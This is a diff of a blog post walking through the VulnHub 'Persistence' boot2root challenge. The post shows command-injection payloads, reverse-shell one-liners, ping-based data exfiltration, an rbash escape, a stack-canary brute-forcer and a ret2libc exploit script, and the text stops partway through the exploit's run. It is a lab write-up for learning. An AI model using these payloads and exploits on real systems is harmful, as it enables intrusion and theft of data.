@@ -8,26 +8,21 @@ categories:
 comments: true
 date: 2014-09-18T06:58:53Z
 title: From Persistence, to pain, to PWN
-url: /2014/09/18/from-persistence/
 ---
 
-##persist we must!
+## persist we must!
 Persistence! A new boot2root hosted [@VulnHub](https://twitter.com/vulnhub), authored by [@superkojiman](https://twitter.com/superkojiman) and sagi- definitely got the attention from the community it deserves! Persistence was actually part of a [writeup competition](http://blog.vulnhub.com/2014/09/competition-persistence.html) launched on September the 7th, and ran up until October th 5th.
-
-{% blockquote Benjamin Franklin %}
-Energy and persistence conquer all things.
-{% endblockquote %}
 
 This is my experience while trying to complete the challenge. Persistence, once again, challenged me to learn about things that would normally have me just go "meh, next". As expected, this post is also a very big spoiler if you have not completed it yourself yet, so be warned!
 
 <!--more-->
 
-##lets get our hands dirty
+## lets get our hands dirty
 As usual, the goto tool was Kali Linux, and the normal steps of adding the OVA image to Virtualbox, booting, finding the assigned IP and running a Nmap scan against it was used.
 
 My VM got the IP 192.168.56.104, and the first Nmap result was:
 
-```bash First Persistence Nmap
+```bash
 root@kali:~# nmap 192.168.56.104 --reason -sV -p-
 
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-09-18 07:01 SAST
@@ -48,7 +43,7 @@ Browsing to the site did not reveal anything interesting. A creepy image of melt
 
 By default, most web servers will serve the default index page when no location is specified from the web root. So, I tried `index.html`, and got the normal landing. When I requested `index.php` though, things changed drastically:
 
-```bash PHP reveal
+```bash
 root@kali:~# curl -v 192.168.56.104/index.php
 * About to connect() to 192.168.56.104 port 80 (#0)
 *   Trying 192.168.56.104...
@@ -77,12 +72,12 @@ No input file specified.
 
 As can be seen in the output above, the header `X-Powered-By: PHP/5.3.3` is now present, and the output `No input file specified.`. I recognized this as the behavior of Nginx when PHP-FPM is unable to locate the .php file it should be serving.
 
-##finding that (de)bugger
+## finding that (de)bugger
 With this information now gathered, it was time to pull out one of my favorite tools, `wfuzz`! With `wfuzz`, the plan now was to attempt and discover a potentially interesting web path, or, because I know the web server has the capability of serving up PHP content, attempt to find arb PHP scripts.
 
 My first attempt to search for web paths failed pretty badly. All of the requests responded with a 404. Luckily I was aware of the PHP capabilities, so I set to find arbritary PHP scripts by appending _.php_ to my `FUZZ` keyword:
 
-```bash discovering debug.php
+```bash
 root@kali:~# wfuzz -c -z file,/usr/share/wordlists/wfuzz/general/medium.txt --hc 404 http://192.168.56.104/FUZZ.php
 
 ********************************************************
@@ -94,7 +89,7 @@ Payload type: file,/usr/share/wordlists/wfuzz/general/medium.txt
 
 Total requests: 1660
 ==================================================================
-ID  Response   Lines      Word         Chars          Request    
+ID  Response   Lines      Word         Chars          Request
 ==================================================================
 
 00434:  C=200     12 L        28 W      357 Ch    " - debug"
@@ -102,15 +97,15 @@ ID  Response   Lines      Word         Chars          Request
 
 Yay. `wfuzz` is stupidly fast and finished the above in like 4 seconds. Browsing to http://192.168.56.101/debug.php showed us a input field labeled "Ping address:" and a submit button
 
-{% img https://i.imgur.com/neKe18e.png %}
+{{< figure src="/images/persistence_debug_php.png" >}}
 
 "Command injection?", was the first thought here.
 
-##blind command injection
+## blind command injection
 I started by entering a valid IP address that had `tcpdump` listening to test if the script is actually running a ping like it says ...
 
-```bash ping test
-root@kali:~# tcpdump icmp 
+```bash
+root@kali:~# tcpdump icmp
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
 07:46:15.503023 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 64004, seq 1, length 64
@@ -131,19 +126,19 @@ This is all good, but not getting any output makes it really had to work with th
 
 I tried the usual culprits: `nc <ip>  <port> -e /bin/bash`; `bash -i >& /dev/tcp/<ip>/<port> 0>&1`; `php -r '$sock=fsockopen("<ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'`. None of them worked. Eventually I started to realize that I may have a much bigger problem here. What if none of these programs (nc/bash/php) are either not executable by me or simply not in my PATH? What if there was a egress packet filter configured?
 
-##blind command injection - file enumeration
+## blind command injection - file enumeration
 Ok, so I took one step back and had to rethink my strategy. I have blind command execution, but how am I going to find out what else is going on on the filesystem? Up to now I have simply assumed too much.
 
 I thought I should try and see if I can confirm the existence of files. To do this, I used a simple bash `if [ -f /file ]` statement, with a single ping for success, and 2 pings for a failure. The string for the `debug.php` input field looked something like this:
 
-```bash File existence check payload
+```bash
 ;if [ -f /bin/sh ] ; then ping 192.168.56.102 -c 1 ; else ping 192.168.56.102 -c 2 ; fi
 ```
 
 Submitting the above input presented me with a single ping, confirming that `/bin/sh` exists.
 
-```bash File existence response
-root@kali:~# tcpdump icmp 
+```bash
+root@kali:~# tcpdump icmp
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
 08:15:53.557994 IP 192.168.56.104 > 192.168.56.102: ICMP echo request, id 63493, seq 1, length 64
@@ -155,14 +150,14 @@ Checking for something like `/bin/sh2` responded with 2 pings, as expected. Awes
 
 I continued to test numerous files on numerous locations on disk. I noticed a few files that would generally be available on most Linux systems were not available according to my checker which was really odd. It actually had me doubt the check too. Nonetheless,  `/usr/bin/python` appeared to be available! I really like python so this had me really happy.
 
-##blind command injection - port scanner
+## blind command injection - port scanner
 I tested a few commands with `python -c`, such as sleep etc just to confirm that it is working. I then proceeded to try and get a reverse shell going using it.
 
 No. Luck.
 
 I no longer doubted the fact that I had a working interpreter, however, the question about a egress firewall still remains unanswered. To test this, I decided to code a small, cheap-and-nasty port 'prober' so that I can try and determine which port is open outgoing. The idea was to watch my `tcpdump` for any tcp traffic comming from this host:
 
-```python probe.py
+```python
 import socket
 for port in xrange(1, 65535):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -173,14 +168,14 @@ for port in xrange(1, 65535):
 
 Using my blind command injection, I echoed this content to `/tmp/probe.py` via the input field, and then in a subsequent request, ran it using `python /tmp/probe.py`. I was relatively certain the script was running as intended as it took the expected amount of time (similar to when I was testing locally) to complete the HTTP request. According to my prober (and assuming it actually worked), there were 0 tcp ports open...
 
-##data exfiltration
+## data exfiltration
 With no tcp out, I had to once again rethink what I have up to now. The only output I have atm is a true/false scenario. Hardly sufficient to do anything useful. I found the `debug.php` file on disk and tried to echo a PHP web shell to the same directory. This also failed.
 
 So, only ping eh. I recall something about ping tunnels/ping shells/ping something. So, I googled some of these solutions. There were a number of things I could try, however, I was wondering how the actual data transport was happening for these things.
 
 Eventually, I came across the `-p` argument for ping after reading [this](http://blog.commandlinekungfu.com/2012/01/episode-164-exfiltration-nation.html) blogpost. From `man 8 ping` we read:
 
-```bash ping patterns
+```bash
 -p pattern
    You may specify up to 16 ``pad'' bytes to fill out the packet you send.
    This is useful for diagnosing data-dependent problems in a network.
@@ -192,13 +187,13 @@ So that changes things. I quickly confirmed that we have `xxd` available using m
 I fired up tcpdump with the `-X` flag to show me the packet contents, and tested it out with the following payload for the `id` command:
 
 
-```bash Ping pattern `id` command
+```bash
 ;id| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
 ```
 
 On the `tcpdump` side of things...
 
-```bash Ping pattern tcpdump
+```bash
 root@kali:~/Desktop# tcpdump icmp -X
 tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
 listening on eth0, link-type EN10MB (Ethernet), capture size 65535 bytes
@@ -252,7 +247,7 @@ In case you don't see it, we have extracts of the `id` command in the request/re
 
 I fiddled around with this for a little while longer, trying to make the output a little more readable. Eventually I fired up scapy and just printed the data section of the packet. Not much better, but with a little more effort I am sure you can get something very workable out of it.
 
-```python Scapy sniff()
+```python
 >>> sniff(filter="icmp[icmptype] == 8 and host 192.168.56.104", prn=lambda x: x.load)
 ؤT�nginx) guid=498(nginx) guid=498(nginx) guid=498(
 ؤT
@@ -263,13 +258,13 @@ oups=498(nginx)
 oups=498
 ```
 
-##sysadmin-tool
+## sysadmin-tool
 So with actual output to work with, I can almost say I have shell, however, it's crap. Here I had many options to go for. Do I try and get one of those ping tunnels up to shell with? Or something else.
 
 At one stage I ran `ls` as the command trying to see if there was anything in the web path that I may not have found yet. A file called _sysadmin-tool_ was revealed. I browsed to the file which pushed it as a download for me, and saved it locally. I then ran the bin through `strings`:
 
-```bash sysadmin-tool strings
-root@kali:~# strings sysadmin-tool 
+```bash
+root@kali:~# strings sysadmin-tool
 /lib/ld-linux.so.2
 __gmon_start__
 libc.so.6
@@ -284,7 +279,7 @@ chdir
 system
 __libc_start_main
 GLIBC_2.0
-PTRh 
+PTRh
 [^_]
 Usage: sysadmin-tool --activate-service
 --activate-service
@@ -298,11 +293,11 @@ Use avida:dollars to access.
 
 From this alone we can deduce that when run, it may modify the firewall. It also looks like it contains some credentials, so I took note of those too. I then tried to run the command, followed by a nmap scan:
 
-```bash Ping pattern `id` command
+```bash
 ;./sysadmin-tool --activate-service| xxd -p -c 16 | while read line; do ping -p $line -c 1 -q 192.168.56.102; done
 ```
 
-```bash second nmap of Persistence
+```bash
 root@kali:~# nmap 192.168.56.104 --reason -sV -p-
 
 Starting Nmap 6.46 ( http://nmap.org ) at 2014-09-18 09:46 SAST
@@ -320,10 +315,10 @@ Nmap done: 1 IP address (1 host up) scanned in 6637.05 seconds
 
 Yay! SSH.
 
-##shell and breakout as avida
+## shell and breakout as avida
 Using the information that looked like credentials retrieved in the previous section, I proceeded to SSH into the server:
 
-```bash avida rbash
+```bash
 root@kali:~/Desktop/persistence# ssh avida@192.168.56.104
 The authenticity of host '192.168.56.104 (192.168.56.104)' can't be established.
 RSA key fingerprint is 37:22:da:ba:ef:05:1f:77:6a:30:6f:61:56:7b:47:54.
@@ -336,7 +331,7 @@ Last login: Thu Sep 18 05:57:30 2014
 
 Op success. Or is it? I immediately noticed the prompt as `rbash`, aka restricted bash. :( Having a look around, I was in fact very limited to what I can do. Most annoyingly, I was unable to run commands with a `/` in them.
 
-```bash rbash restrictions
+```bash
 -rbash-4.1$ /bin/bash
 -rbash: /bin/bash: restricted: cannot specify `/' in command names
 ```
@@ -345,7 +340,7 @@ So the next logical step was to attempt 'breaking out' of this shell so that I c
 
 After quite some time and some research, it became apparent that the well known breakouts from rbash are not possible.  I was unable to edit my PATH, change files and re-login or use the classic `vi` `:shell` breakout. Eventually (and out of desperation), I focussed my attention to `ftp`. Opening `ftp`, and typing `help` at the prompt, I studied each available command carefully. In the list was a exclamation mark(!), which I typed and pressed enter:
 
-```bash bash via ftp o_0
+```bash
 -rbash-4.1$ ftp
 ftp> !
 +rbash-4.1$ /bin/bash
@@ -354,10 +349,10 @@ bash-4.1$
 
 I got dropped into another `rbash` shell, however this time with a +. So, I went for `/bin/bash` and... w00t? I exported a new PATH to my environment, and all of those annoying rbash restrictions were gone. Thank goodness!
 
-##the wopr game
+## the wopr game
 During the enumeration done while still stuck with `rbash`, I noticed that the machine was listening for connections on tcp/3333 locally when inspecting the output of `netstat`. Opening a telnet session to this port presented you with a 'game':
 
-```bash wopr
+```bash
 bash-4.1$ telnet 127.0.0.1 3333
 Trying 127.0.0.1...
 Connected to 127.0.0.1.
@@ -375,21 +370,21 @@ I asked really, really nicely, but no matter how polite I was, it would just not
 
 Further inspection showed that the game was possibly run as root from `/usr/local/bin/wopr`
 
-```bash wopr as root
+```bash
 bash-4.1$ ps -ef | grep wopr
 root      1005     1  0 05:42 ?        00:00:00 /usr/local/bin/wopr
 root      1577  1005  0 06:43 ?        00:00:00 [wopr] <defunct>
 avida     1609  1501  0 06:47 pts/0    00:00:00 grep wopr
 
-bash-4.1$ ls -lah /usr/local/bin/wopr 
+bash-4.1$ ls -lah /usr/local/bin/wopr
 -rwxr-xr-x. 1 root root 7.7K Apr 28 07:43 /usr/local/bin/wopr
 ```
 
 `wopr` was also readable to me which was great news! I decided to get a copy of the binary onto my local Kali Linux box, and take a closer look at the internals:
 
-```bash wopr xxd xfer
+```bash
 # first, hex encode the file
-bash-4.1$ xxd -p -c 36 /usr/local/bin/wopr 
+bash-4.1$ xxd -p -c 36 /usr/local/bin/wopr
 7f454c460101010000000000000000000200030001000000c08604083400000080110000
 0000000034002000090028001e001b000600000034000000348004083480040820010000
 [... snip ...]
@@ -404,11 +399,11 @@ root@kali:~# cat wopr.xxd | xxd -r -p > wopr
 
 The idea was to see if there may be a way to exploit this program so that I can execute some commands using it. It is running as root after all...
 
-##wopr, stack smashing
+## wopr, stack smashing
 Poking around the binary, I mostly used `gdb` along with [peda](https://github.com/longld/peda).
 Checksec revealed that this binary was compiled with quite a few security features built in.
 
-```bash wopr binary sec
+```bash
 root@kali:~# gdb -q ./wopr
 Reading symbols from persistence/wopr...(no debugging symbols found)...done.
 gdb-peda$ checksec
@@ -423,7 +418,7 @@ Digesting the above output should bring us to a few conclusions. A stack canary 
 
 With all of that in mind, I ran the binary with the `r` command, and made a new telnet session to it.
 
-```bash wopr run
+```bash
 gdb-peda$ r
 [+] bind complete
 [+] waiting for connections
@@ -437,7 +432,7 @@ gdb-peda$
 
 When the new connection came in, a notice of a new process appears. Disassembling the main function gives us an indication that the process is doing a `fork()`
 
-```bash wopr fork()
+```bash
 gdb-peda$ disass main
 Dump of assembler code for function main:
     [.. snip ..]
@@ -453,7 +448,7 @@ Dump of assembler code for function main:
    0x08048a2f <+593>:   call   0x804858c <write@plt>
     [.. snip ..]
 End of assembler dump.
-gdb-peda$ 
+gdb-peda$
 ```
 
 Why is the `fork()` so important!? We will see in a bit just hang on. :)
@@ -461,7 +456,7 @@ Why is the `fork()` so important!? We will see in a bit just hang on. :)
 So back to fuzzing wopr, I proceeded to send some arbtritary input via the telnet session. I noticed once I had sent more than 30 characters as input, wopr would freak out! This is a good freak out btw :D
 
 Sending 30 x A's results in:
-```bash wopr stopper
+```bash
 gdb-peda$ [+] got a connection
 *** stack smashing detected ***: wopr terminated
 ======= Backtrace: =========
@@ -478,13 +473,13 @@ wopr[0x80486e1]
 0804b000-0806c000 rw-p 00000000 00:00 0          [heap]
 b7e3b000-b7e57000 r-xp 00000000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
 b7e57000-b7e58000 rw-p 0001b000 08:01 1573598    /lib/i386-linux-gnu/libgcc_s.so.1
-b7e73000-b7e74000 rw-p 00000000 00:00 0 
+b7e73000-b7e74000 rw-p 00000000 00:00 0
 b7e74000-b7fbd000 r-xp 00000000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
 b7fbd000-b7fbe000 ---p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
 b7fbe000-b7fc0000 r--p 00149000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
 b7fc0000-b7fc1000 rw-p 0014b000 08:01 1580474    /lib/i386-linux-gnu/libc-2.13.so
-b7fc1000-b7fc4000 rw-p 00000000 00:00 0 
-b7fde000-b7fe1000 rw-p 00000000 00:00 0 
+b7fc1000-b7fc4000 rw-p 00000000 00:00 0
+b7fde000-b7fe1000 rw-p 00000000 00:00 0
 b7fe1000-b7fe2000 r-xp 00000000 00:00 0          [vdso]
 b7fe2000-b7ffe000 r-xp 00000000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
 b7ffe000-b7fff000 r--p 0001b000 08:01 1579852    /lib/i386-linux-gnu/ld-2.13.so
@@ -496,7 +491,7 @@ So it looks like we may have a [buffer overflow](http://en.wikipedia.org/wiki/St
 
 But lets not stop there. I continued to place more A's into the input until at byte 39 I noticed 41 (hex for A) in the backtrace. By the time I had 42 A's, the backtrace had a full 4 bytes of 41.
 
-```bash possible EIP
+```bash
 [+] got a connection
 *** stack smashing detected ***: wopr terminated
 ======= Backtrace: =========
@@ -507,7 +502,6 @@ wopr[0x80487dc]
 ```
 
 Was this where EIP was?
-
 With the debugging we have done thus far, lets assume that the stack layout looks something like this:
 
 ```text
@@ -518,7 +512,7 @@ With the debugging we have done thus far, lets assume that the stack layout look
 - ->         - ->        [42 Bytes  in Total]        - ->         - >
 ```
 
-##wopr - stack canary bruteforce
+## wopr - stack canary bruteforce
 This part of the challenge took me the second longest to nail. I have zero knowledge of stack cookies, let alone experience in bypassing them. So I had to pack out my best Google-fu abilities and learn all I can about bypassing these cookies.
 
 A lot was learnt here. The 3 primary resources that really helped me get the ball rolling into something workable was
@@ -531,10 +525,10 @@ Now, remember I mentioned `fork()` earlier on? From the Phrack article, we can r
 
 From `man 2 fork`'s description:
 
-```bash fork man
+```bash
 DESCRIPTION
-     Fork() causes creation of a new process.  The new process (child process) 
-     is an exact copy of the calling process (parent process) except for the 
+     Fork() causes creation of a new process.  The new process (child process)
+     is an exact copy of the calling process (parent process) except for the
      following:
 
  [.. snip ..]
@@ -548,7 +542,7 @@ While thinking about this problem, I started to code a little script to start th
 
 When a string of less than 30 A's is sent, the server will send a "[+] bye!" message before closing the socket. More than 30 A's, and the socket is killed before the bye
 
-```bash Canary Brute Success Condition
+```bash
 root@kali:~# telnet 127.0.0.1 3333
 Trying 127.0.0.1...
 Connected to 127.0.0.1.
@@ -573,7 +567,7 @@ Connection closed by foreign host. # <-- No bye!
 
 This was perfect and exactly what was needed to complete the brute force script! All I had to do was check for the word _bye_ in the last socket receive to know if we have succeeded or not. The resultant script was therefore:
 
-```python canary_brute.py
+```python
 import socket
 import sys
 
@@ -593,7 +587,7 @@ for x in xrange(1,5):
         send = payload + canary + hex_byte
 
         print "[+] Trying: '\\x{0}' in payload '%s' (%d:%d/255)".format(hex_byte.encode("hex")) % (send, x, canary_byte)
-    
+
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         sock.connect(('127.0.0.1', 3333))
 
@@ -602,7 +596,7 @@ for x in xrange(1,5):
         sock.recv(40)   # [+] would you like to play a game?\n
         sock.recv(5)    # >
 
-        # send the payload  
+        # send the payload
         sock.send(send)
         sock.recv(27)   # [+] yeah, I don't think so\n
 
@@ -630,7 +624,7 @@ else:
 
 An example run of this would end as follows:
 
-```bash Running canary_brute.py
+```bash
 [+] Trying: '\x8d' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:141/255)
 [+] Trying: '\x8e' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:142/255)
 [+] Trying: '\x8f' in payload 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA' (4:143/255)
@@ -641,20 +635,20 @@ An example run of this would end as follows:
 
 Winning. Just to make 100% sure I actually have the correct canary, I made another small socket program just to append the canary to the initial 30 A's and send it. No stack smashing message appeared and we got the _bye_ message :)
 
-##wopr - NX and EIP
+## wopr - NX and EIP
 If you can recall from earlier, `wopr` was compiled with the NX bit set. Effectively that means we can't simply exploit this vulnerability by setting EIP to the beginning of shellcode we simply sent along with the payload as the stack is not executable. Thankfully though, there is a concept such as ret2libc.
 
 The idea behind ret2libc is to steer the application flow to useful commands within libc itself, and get code execution that way. A very popular function to use is the `system()` command, for almost obvious reasons.
 
 I decided to make use of the same method. I quickly checked to see if ASLR was enabled on the Persistence VM:
 
-```bash ASLR check
-bash-4.1$ ldd /usr/local/bin/wopr 
+```bash
+bash-4.1$ ldd /usr/local/bin/wopr
     linux-gate.so.1 =>  (0xb7fff000)
     libc.so.6 => /lib/libc.so.6 (0xb7e62000)
     /lib/ld-linux.so.2 (0x00110000)
 
-bash-4.1$ ldd /usr/local/bin/wopr 
+bash-4.1$ ldd /usr/local/bin/wopr
     linux-gate.so.1 =>  (0xb7fff000)
     libc.so.6 => /lib/libc.so.6 (0xb7e62000)
     /lib/ld-linux.so.2 (0x00110000)
@@ -664,17 +658,17 @@ The addresses for the linked files remained static between all of the lookups, i
 
 The next step was to find out where system() lived in libc. This is also a very easy step to perform. A interesting note here. GDB was using the SHELL env variable for commands, and because I have come from rbash, it was still set to that. A simple `export SHELL=/bin/bash` fixed it though. Also, just to be clear, I am now doing this address lookup on the Persistence VM, however I had to do exactly the same thing on the Kali VM where I was building my exploit.
 
-```bash finding system()
+```bash
 bash-4.1$ export SHELL=/bin/bash
 
-bash-4.1$ gdb -q /usr/bin/telnet 
+bash-4.1$ gdb -q /usr/bin/telnet
 Reading symbols from /usr/bin/telnet...(no debugging symbols found)...done.
 Missing separate debuginfos, use: debuginfo-install telnet-0.17-47.el6_3.1.i686
 (gdb) b *main   # set a breakpoint to stop the flow once we hit the main() func
 Breakpoint 1 at 0x7b90
 
 (gdb) r         # run the program
-Starting program: /usr/bin/telnet 
+Starting program: /usr/bin/telnet
 Breakpoint 1, 0x00117b90 in main ()
 
 (gdb) p system  # We hit our breakpoint, lets leak the address for system()
@@ -686,7 +680,7 @@ We find `system()` at `0xb7e56210`. I used the telnet binary simply because it i
 
 So to sum up what we have so far, lets take another look at what the stack will look like now when sending our exploit payload:
 
-```text Stack after memory corruption up to EIP
+```text
 - ->         - ->        [42 Bytes  in Total]        - ->           - >
 
 [   A x 30   ] [  \xff\xff\xff\xff  ] [  AAAA  ] [  \x10\x62\xe5\xb7  ]
@@ -697,13 +691,13 @@ So to sum up what we have so far, lets take another look at what the stack will 
 
 The address for `system()` is 'backwards' because we are working with a [little endian](http://en.wikipedia.org/wiki/Endianness) system. The 4 * A before the address to `system()` is simply padding to EIP.
 
-##wopr - code exec
+## wopr - code exec
 This part, by far, took me **the longest** of the entire challenge!
 
 The next step was to get actual code to execute using `system()`. While this may sound trivial, it has challenges of its own. One of the key things I had to realize whilst getting frustrated with this was "to remember, you are trying to make a program do what it is not intended to do, expect difficulty!".
 
-I tried to put a command in a env variable and failed.  
-I attempted to write a ROP chain and failed.  
+I tried to put a command in a env variable and failed.
+I attempted to write a ROP chain and failed.
 
 These failed mostly due to by own lack of understanding, tiredness and frustration. My attempts generally was to get a script `/tmp/runme` to run. `runme` was a bash script that will compile a small C shell, change ownership and set the suid bit. Yes, Persistence had `gcc` installed :)
 
@@ -713,7 +707,7 @@ Eventually, I finally came to the realization that I may have to search for othe
 
 Returning later with a fresh look, I run wopr through `strings` one more time:
 
-```bash wopr strings
+```bash
 root@kali:~/Desktop/persistence# strings  wopr
 /lib/ld-linux.so.2
 __gmon_start__
@@ -746,7 +740,7 @@ I confirmed that `/tmp/log` wasn't actually in use, and moved my original `/tmp/
 
 The only thing that was left now was to find the location of the string `/tmp/log` in `wopr`, push that to the stack, and ride the bus home. So lets do the hard work required to find this valuable piece of the puzzle:
 
-```bash finding /tmp/log
+```bash
 root@kali:~# gdb -q ./wopr
 Reading symbols from wopr...(no debugging symbols found)...done.
 
@@ -756,19 +750,19 @@ Breakpoint 1 at 0x80487de
 gdb-peda$ r
 [----------------------------------registers-----------------------------------]
 EAX: 0xbffff4a4 --> 0xbffff60a ("wopr")
-EBX: 0xb7fbfff4 --> 0x14bd7c 
-ECX: 0x66a6f92e 
-EDX: 0x1 
-ESI: 0x0 
-EDI: 0x0 
-EBP: 0xbffff478 --> 0x0 
+EBX: 0xb7fbfff4 --> 0x14bd7c
+ECX: 0x66a6f92e
+EDX: 0x1
+ESI: 0x0
+EDI: 0x0
+EBP: 0xbffff478 --> 0x0
 ESP: 0xbffff3fc --> 0xb7e8ae36 (<__libc_start_main+230>:    mov    DWORD PTR [esp],eax)
 EIP: 0x80487de (<main>: push   ebp)
 EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
 [-------------------------------------code-------------------------------------]
    0x80487d7 <get_reply+99>:    call   0x804865c <__stack_chk_fail@plt>
-   0x80487dc <get_reply+104>:   leave  
-   0x80487dd <get_reply+105>:   ret    
+   0x80487dc <get_reply+104>:   leave
+   0x80487dd <get_reply+105>:   ret
 => 0x80487de <main>:    push   ebp
    0x80487df <main+1>:  mov    ebp,esp
    0x80487e1 <main+3>:  sub    esp,0x258
@@ -776,13 +770,13 @@ EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
    0x80487ea <main+12>: mov    DWORD PTR [ebp-0x23c],eax
 [------------------------------------stack-------------------------------------]
 0000| 0xbffff3fc --> 0xb7e8ae36 (<__libc_start_main+230>:   mov    DWORD PTR [esp],eax)
-0004| 0xbffff400 --> 0x1 
+0004| 0xbffff400 --> 0x1
 0008| 0xbffff404 --> 0xbffff4a4 --> 0xbffff60a ("wopr")
 0012| 0xbffff408 --> 0xbffff4ac --> 0xbffff629 ("SSH_AGENT_PID=3171")
-0016| 0xbffff40c --> 0xb7fe08d8 --> 0xb7e74000 --> 0x464c457f 
+0016| 0xbffff40c --> 0xb7fe08d8 --> 0xb7e74000 --> 0x464c457f
 0020| 0xbffff410 --> 0xb7ff6821 (mov    eax,DWORD PTR [ebp-0x10])
-0024| 0xbffff414 --> 0xffffffff 
-0028| 0xbffff418 --> 0xb7ffeff4 --> 0x1cf2c 
+0024| 0xbffff414 --> 0xffffffff
+0028| 0xbffff418 --> 0xb7ffeff4 --> 0x1cf2c
 [------------------------------------------------------------------------------]
 Legend: code, data, rodata, value
 Breakpoint 1, 0x080487de in main ()
@@ -796,7 +790,7 @@ wopr : 0x8049c60 ("/tmp/log")
 
 `/tmp/log` can be found in 2 places. Lets choose `0x8048c60`! Now we finally have everything we need to build the payload to send.
 
-##wopr - the exploit
+## wopr - the exploit
 To sum up what we have to do to exploit this, we can say that we have to:
 
 - Provide a string of size 30
@@ -809,13 +803,13 @@ To sum up what we have to do to exploit this, we can say that we have to:
 In my exploit, as a result of the above, I would therefore send a payload similar to this:
 
 ```text
-"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\xff\xff\xff\xff" + "AAAA" + 
+"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" + "\xff\xff\xff\xff" + "AAAA" +
 "\x10\xc2\x16\x00" + "JUNK" + "\x60\x8c\x04\x08"
 ```
 
 I finished up coding the exploit, which eventually resulted in the following:
 
-```python Persistence Sploit
+```python
 import socket
 import sys
 import os
@@ -827,21 +821,21 @@ print """
             A: "So, I heard you like pain...?"
             B: "... a bit"
             C: "Well, here it is, the: "
- ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___ 
+ ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
 |    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]
-|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_ 
+|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_
 |   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]
-|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_ 
+|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_
 |  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
 |__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|
-      _____ ____  _       ___  ____  ______ 
+      _____ ____  _       ___  ____  ______
      / ___/|    \| |     /   \|    ||      |
     (   \_ |  o  ) |    |     ||  | |      |
      \__  ||   _/| |___ |  O  ||  | |_|  |_|
-     /  \ ||  |  |     ||     ||  |   |  |  
-     \    ||  |  |     ||     ||  |   |  |  
-      \___||__|  |_____| \___/|____|  |__|  
-                                        
+     /  \ ||  |  |     ||     ||  |   |  |
+     \    ||  |  |     ||     ||  |   |  |
+      \___||__|  |_____| \___/|____|  |__|
+
                 A: "AKA: FU superkojiman && sagi- !!"
                 A: "I also have no idea what I am doing"
 """
@@ -866,10 +860,10 @@ for x in xrange(1,5):
 
         # get the inital banners
         sock.recv(35)   # [+] hello, my name is sploitable\n
-        sock.recv(40)   # [+] would you like to play a game?\n 
-        sock.recv(5)    # > 
+        sock.recv(40)   # [+] would you like to play a game?\n
+        sock.recv(5)    # >
 
-        # send the payload  
+        # send the payload
         sock.send(send)
         sock.recv(27)   # [+] yeah, I don't think so\n
 
@@ -950,29 +944,29 @@ else:
 
 A sample run would be:
 
-```bash Running sploit.py
-bash-4.1$ ls -lah /tmp/sploit.py 
+```bash
+bash-4.1$ ls -lah /tmp/sploit.py
 -rw-rw-r--. 1 avida avida 4.0K Sep 18 10:33 /tmp/sploit.py
-bash-4.1$ python /tmp/sploit.py 
+bash-4.1$ python /tmp/sploit.py
 
             A: "So, I heard you like pain...?"
             B: "... a bit"
             C: "Well, here it is, the: "
- ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___ 
+ ____   ___  ____    _____ ____ _____ ______    ___  ____     __    ___
 |    \ /  _]|    \  / ___/|    / ___/|      |  /  _]|    \   /  ]  /  _]
-|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_ 
+|  o  )  [_ |  D  )(   \_  |  (   \_ |      | /  [_ |  _  | /  /  /  [_
 |   _/    _]|    /  \__  | |  |\__  ||_|  |_||    _]|  |  |/  /  |    _]
-|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_ 
+|  | |   [_ |    \  /  \ | |  |/  \ |  |  |  |   [_ |  |  /   \_ |   [_
 |  | |     ||  .  \ \    | |  |\    |  |  |  |     ||  |  \     ||     |
 |__| |_____||__|\_|  \___||____|\___|  |__|  |_____||__|__|\____||_____|
-      _____ ____  _       ___  ____  ______ 
+      _____ ____  _       ___  ____  ______
      / ___/|    \| |     /   \|    ||      |
     (   \_ |  o  ) |    |     ||  | |      |
      \__  ||   _/| |___ |  O  ||  | |_|  |_|
-     /  \ ||  |  |     ||     ||  |   |  |  
-     \    ||  |  |     ||     ||  |   |  |  
-      \___||__|  |_____| \___/|____|  |__|  
-                                        
+     /  \ ||  |  |     ||     ||  |   |  |
+     \    ||  |  |     ||     ||  |   |  |
+      \___||__|  |_____| \___/|____|  |__|
+
                 A: "AKA: FU superkojiman && sagi- !!"
                 A: "I also have no idea what I am doing"
 
